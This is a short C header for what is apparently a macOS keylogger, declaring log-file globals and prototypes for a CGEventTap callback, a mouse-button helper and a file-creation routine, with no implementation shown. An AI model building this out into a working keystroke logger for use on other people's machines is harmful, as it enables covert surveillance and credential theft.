#ifndef __KEYLOGGER_H__
#define __KEYLOGGER_H__

#include <stdio.h>
#include <time.h>
#include <string.h>
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>

FILE *logfile = NULL;
int theday = 550;
struct tm* tm;
time_t now = 0;
char logDirectory[250];
char logFileLocation[50];

CGEventRef CGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void*);
const char *recognizeMouseButton(CGEventType);
void createNewFile();

#endif
